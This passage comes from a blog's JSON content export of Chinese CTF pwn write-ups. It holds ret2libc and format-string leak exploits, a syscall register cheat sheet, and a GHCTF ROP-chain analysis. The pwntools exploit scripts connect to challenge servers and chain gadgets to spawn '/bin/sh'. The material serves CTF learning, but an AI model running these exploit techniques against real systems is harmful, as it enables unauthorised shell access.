class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">128</span></span><br><span class=\"line\">libc_base=start_addr-libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;start_addr-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(start_addr)))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">system=libc_base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">one=libc_base+<span class=\"number\">0xebc85</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x38</span>)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"迁移泄露\"><a href=\"#迁移泄露\" class=\"headerlink\" title=\"迁移泄露\"></a>迁移泄露</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28268</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leave_ret=0x</span></span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">complete=<span class=\"number\">0x404070</span></span><br><span class=\"line\">func=<span class=\"number\">0x40121f</span></span><br><span class=\"line\">magic=<span class=\"number\">0x401252</span></span><br><span class=\"line\">bss=elf.bss()+<span class=\"number\">0x500</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">rsp_8=<span class=\"number\">0x401016</span></span><br><span class=\"line\">offset=<span class=\"number\">0x30</span>+<span class=\"number\">8</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;%13$s&#x27;</span>.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x404038</span>)</span><br><span class=\"line\">payload+=p64(func)</span><br><span class=\"line\">payload+=p64(puts_got)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">read=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;read-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(read)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=read-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">sys=libc_base+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts=libc_base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">printf=libc_base+libc.sym[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">setvbuf=libc_base+libc.sym[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\">bin_sh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">ret=libc_base+<span class=\"number\">0x29139</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)</span><br><span class=\"line\">payload+=p64(bss)+p64(magic)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload=offset * <span class=\"string\">b&#x27;a&#x27;</span></span><br><span class=\"line\">payload+=p64(pop_rdi)</span><br><span class=\"line\">payload+=p64(bin_sh)</span><br><span class=\"line\">payload+=p64(ret)</span><br><span class=\"line\">payload+=p64(sys)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"CTFshow pwn161","_content":"# CTFshow pwn161(堆重叠)\n\n## ida分析\n\n=\n","source":"_posts/heap/CTFshow pwn161.md","raw":"---\ntitle: CTFshow pwn161\n---\n# CTFshow pwn161(堆重叠)\n\n## ida分析\n\n=\n","slug":"heap/CTFshow pwn161","published":1,"date":"2025-03-24T14:32:33.566Z","updated":"2025-03-24T14:37:16.150Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9ig0008bcmyhq958d1i","content":"<h1 id=\"CTFshow-pwn161-堆重叠\"><a href=\"#CTFshow-pwn161-堆重叠\" class=\"headerlink\" title=\"CTFshow pwn161(堆重叠)\"></a>CTFshow pwn161(堆重叠)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><p>&#x3D;</p>\n","excerpt":"","more":"<h1 id=\"CTFshow-pwn161-堆重叠\"><a href=\"#CTFshow-pwn161-堆重叠\" class=\"headerlink\" title=\"CTFshow pwn161(堆重叠)\"></a>CTFshow pwn161(堆重叠)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><p>&#x3D;</p>\n"},{"title":"syscall 知识梳理","_content":"# syscall 知识梳理\n\n##  系统调用号\n\n### 32位\n```\nread 3     eax=3  ebx=fd ecx=buf edx=size\nwrite 4    eax=4  ebx=fd ecx=buf edx=size\nopen 5     eax=5  ebx=path ecx=flags edx=mode\nclose 6    eax=6  ebx=fd\nexecve 11  eax=0xb  ebx=\"/bin/sh\\x00\" ecx=0 edx=0\n\nint 0x80\n```\n### 64位\n```\nread 0     rax=0 rdi=fd rsi=buf rdx=size\nwrite 1    rax=1 rdi=fd rsi=buf rdx=size\nopen 2     rax=2 rdi=patch rsi=flags rdx=mode\nclose 3    rax=3 rdi=fd \nexecve 59  rax=0x3b rdi=\"/bin/sh\\x00\" rsi=0 rdx=0\n\nsys_call\n```\n","source":"_posts/syscall/syscall.md","raw":"---\ntitle: syscall 知识梳理\n---\n# syscall 知识梳理\n\n##  系统调用号\n\n### 32位\n```\nread 3     eax=3  ebx=fd ecx=buf edx=size\nwrite 4    eax=4  ebx=fd ecx=buf edx=size\nopen 5     eax=5  ebx=path ecx=flags edx=mode\nclose 6    eax=6  ebx=fd\nexecve 11  eax=0xb  ebx=\"/bin/sh\\x00\" ecx=0 edx=0\n\nint 0x80\n```\n### 64位\n```\nread 0     rax=0 rdi=fd rsi=buf rdx=size\nwrite 1    rax=1 rdi=fd rsi=buf rdx=size\nopen 2     rax=2 rdi=patch rsi=flags rdx=mode\nclose 3    rax=3 rdi=fd \nexecve 59  rax=0x3b rdi=\"/bin/sh\\x00\" rsi=0 rdx=0\n\nsys_call\n```\n","slug":"syscall/syscall","published":1,"date":"2025-03-24T14:32:33.539Z","updated":"2025-03-24T14:36:10.163Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9ih0009bcmydq2mdmm7","content":"<h1 id=\"syscall-知识梳理\"><a href=\"#syscall-知识梳理\" class=\"headerlink\" title=\"syscall 知识梳理\"></a>syscall 知识梳理</h1><h2 id=\"系统调用号\"><a href=\"#系统调用号\" class=\"headerlink\" title=\"系统调用号\"></a>系统调用号</h2><h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 3     eax=3  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">write 4    eax=4  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">open 5     eax=5  ebx=path ecx=flags edx=mode</span><br><span class=\"line\">close 6    eax=6  ebx=fd</span><br><span class=\"line\">execve 11  eax=0xb  ebx=&quot;/bin/sh\\x00&quot; ecx=0 edx=0</span><br><span class=\"line\"></span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 0     rax=0 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">write 1    rax=1 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">open 2     rax=2 rdi=patch rsi=flags rdx=mode</span><br><span class=\"line\">close 3    rax=3 rdi=fd </span><br><span class=\"line\">execve 59  rax=0x3b rdi=&quot;/bin/sh\\x00&quot; rsi=0 rdx=0</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"syscall-知识梳理\"><a href=\"#syscall-知识梳理\" class=\"headerlink\" title=\"syscall 知识梳理\"></a>syscall 知识梳理</h1><h2 id=\"系统调用号\"><a href=\"#系统调用号\" class=\"headerlink\" title=\"系统调用号\"></a>系统调用号</h2><h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 3     eax=3  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">write 4    eax=4  ebx=fd ecx=buf edx=size</span><br><span class=\"line\">open 5     eax=5  ebx=path ecx=flags edx=mode</span><br><span class=\"line\">close 6    eax=6  ebx=fd</span><br><span class=\"line\">execve 11  eax=0xb  ebx=&quot;/bin/sh\\x00&quot; ecx=0 edx=0</span><br><span class=\"line\"></span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read 0     rax=0 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">write 1    rax=1 rdi=fd rsi=buf rdx=size</span><br><span class=\"line\">open 2     rax=2 rdi=patch rsi=flags rdx=mode</span><br><span class=\"line\">close 3    rax=3 rdi=fd </span><br><span class=\"line\">execve 59  rax=0x3b rdi=&quot;/bin/sh\\x00&quot; rsi=0 rdx=0</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call</span><br></pre></td></tr></table></figure>\n"},{"title":"GHCTF 你真的会布置栈吗？","sticky":1,"_content":"#  GHCTF 你真的会布置栈吗？\n\n## ida分析\n\n### _start函数分析 \n![813b6b639a05fd8870ff80b5be117df7.png](https://img.picui.cn/free/2025/03/08/67cc554898165.png)\n1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大\n2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看\n\n### print函数分析\n![a36c17d8abe90bc1a9920db0595e982d.png](https://img.picui.cn/free/2025/03/08/67cc56bc5732f.png)\n1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.\n\n\n### gadgets 分析\n1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.\n2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.\n3.同时，dispatch留有执行rbx中代码的功能.\n4.下方还可以控制rdx，rsi，rdi 值为0.\n\n## 构造思路\n1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。\n2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax=0x3b，可以通过r13 和 `xchg rax，r13` 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，`\"/bin/sh\\x00\"` 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。\n3.read函数，需要控制rax=0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。\n4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell\n5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。\n6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。\n\n## exp \n\n### 花里胡哨的rop\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28634\nelf=ELF(\"./attachment\")\nif mode == 0:\n    io=process(\"./attachment\")\nelse :\n    io=remote(url,port)\n\nsys_call=0x401077\nrax_r13=0x40100c\ndata=0x402000\ngadget_pop=0x401017\ndispatcher=0x401011\nxor_rsi=0x401027\nFree_Gate=0x40101c\nxor_rdx=0x401021\n\npayload=p64(gadget_pop)\npayload+=p64(0)*3\npayload+=p64(gadget_pop) #r15\npayload+=p64(data) #rsi ,rsp\npayload+=p64(0)*3 #rdi,rbx,r13\npayload+=p64(rax_r13) #r15 \npayload+=p64(Free_Gate)\npayload+=p64(sys_call) #r15   read\n\npayload+=p64(gadget_pop)# rsp,rsi\npayload+=p64(data)+p64(0)+p64(0)# rdi,rbx,r13\npayload+=p64(gadget_pop)# r15\npayload+=p64(0) # rsp,rsi\npayload+=p64(data)+p64(data)+p64(0x3b) # rdi,rbx,r13\npayload+=p64(dispatcher)#r15\npayload+=p64(sys_call)\n\nio.send(payload)\npayload=b'/bin/sh\\x00'\npayload+=p64(xor_rdx)+p64(rax_r13)\n#gdb.attach(io)\nio.send(payload)\n\n\nio.interactive()\n```","source":"_posts/rop/GHCTF rop.md","raw":"---\ntitle: GHCTF 你真的会布置栈吗？\nsticky: 1\n---\n#  GHCTF 你真的会布置栈吗？\n\n## ida分析\n\n### _start函数分析 \n![813b6b639a05fd8870ff80b5be117df7.png](https://img.picui.cn/free/2025/03/08/67cc554898165.png)\n1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大\n2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看\n\n### print函数分析\n![a36c17d8abe90bc1a9920db0595e982d.png](https://img.picui.cn/free/2025/03/08/67cc56bc5732f.png)\n1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.\n\n\n### gadgets 分析\n1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.\n2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.\n3.同时，dispatch留有执行rbx中代码的功能.\n4.下方还可以控制rdx，rsi，rdi 值为0.\n\n## 构造思路\n1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。\n2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax=0x3b，可以通过r13 和 `xchg rax，r13` 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，`\"/bin/sh\\x00\"` 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。\n3.read函数，需要控制rax=0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。\n4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell\n5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。\n6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。\n\n## exp \n\n### 花里胡哨的rop\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28634\nelf=ELF(\"./attachment\")\nif mode == 0:\n    io=process(\"./attachment\")\nelse :\n    io=remote(url,port)\n\nsys_call=0x401077\nrax_r13=0x40100c\ndata=0x402000\ngadget_pop=0x401017\ndispatcher=0x401011\nxor_rsi=0x401027\nFree_Gate=0x40101c\nxor_rdx=0x401021\n\npayload=p64(gadget_pop)\npayload+=p64(0)*3\npayload+=p64(gadget_pop) #r15\npayload+=p64(data) #rsi ,rsp\npayload+=p64(0)*3 #rdi,rbx,r13\npayload+=p64(rax_r13) #r15 \npayload+=p64(Free_Gate)\npayload+=p64(sys_call) #r15   read\n\npayload+=p64(gadget_pop)# rsp,rsi\npayload+=p64(data)+p64(0)+p64(0)# rdi,rbx,r13\npayload+=p64(gadget_pop)# r15\npayload+=p64(0) # rsp,rsi\npayload+=p64(data)+p64(data)+p64(0x3b) # rdi,rbx,r13\npayload+=p64(dispatcher)#r15\npayload+=p64(sys_call)\n\nio.send(payload)\npayload=b'/bin/sh\\x00'\npayload+=p64(xor_rdx)+p64(rax_r13)\n#gdb.attach(io)\nio.send(payload)\n\n\nio.interactive()\n```","slug":"rop/GHCTF rop","published":1,"date":"2025-03-24T14:32:33.529Z","updated":"2025-03-24T16:24:44.590Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9io000abcmyf8zd4sue","content":"<h1 id=\"GHCTF-你真的会布置栈吗？\"><a href=\"#GHCTF-你真的会布置栈吗？\" class=\"headerlink\" title=\"GHCTF 你真的会布置栈吗？\"></a>GHCTF 你真的会布置栈吗？</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"start函数分析\"><a href=\"#start函数分析\" class=\"headerlink\" title=\"_start函数分析\"></a>_start函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/08/67cc554898165.png\" alt=\"813b6b639a05fd8870ff80b5be117df7.png\"><br>1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大<br>2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看</p>\n<h3 id=\"print函数分析\"><a href=\"#print函数分析\" class=\"headerlink\" title=\"print函数分析\"></a>print函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/08/67cc56bc5732f.png\" alt=\"a36c17d8abe90bc1a9920db0595e982d.png\"><br>1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.</p>\n<h3 id=\"gadgets-分析\"><a href=\"#gadgets-分析\" class=\"headerlink\" title=\"gadgets 分析\"></a>gadgets 分析</h3><p>1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.<br>2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.<br>3.同时，dispatch留有执行rbx中代码的功能.<br>4.下方还可以控制rdx，rsi，rdi 值为0.</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。<br>2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax&#x3D;0x3b，可以通过r13 和 <code>xchg rax，r13</code> 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，<code>&quot;/bin/sh\\x00&quot;</code> 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。<br>3.read函数，需要控制rax&#x3D;0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。<br>4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell<br>5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。<br>6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"花里胡哨的rop\"><a href=\"#花里胡哨的rop\" class=\"headerlink\" title=\"花里胡哨的rop\"></a>花里胡哨的rop</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28634</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call=<span class=\"number\">0x401077</span></span><br><span class=\"line\">rax_r13=<span class=\"number\">0x40100c</span></span><br><span class=\"line\">data=<span class=\"number\">0x402000</span></span><br><span class=\"line\">gadget_pop=<span class=\"number\">0x401017</span></span><br><span class=\"line\">dispatcher=<span class=\"number\">0x401011</span></span><br><span class=\"line\">xor_rsi=<span class=\"number\">0x401027</span></span><br><span class=\"line\">Free_Gate=<span class=\"number\">0x40101c</span></span><br><span class=\"line\">xor_rdx=<span class=\"number\">0x401021</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(gadget_pop)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">payload+=p64(gadget_pop) <span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(data) <span class=\"comment\">#rsi ,rsp</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> <span class=\"comment\">#rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(rax_r13) <span class=\"comment\">#r15 </span></span><br><span class=\"line\">payload+=p64(Free_Gate)</span><br><span 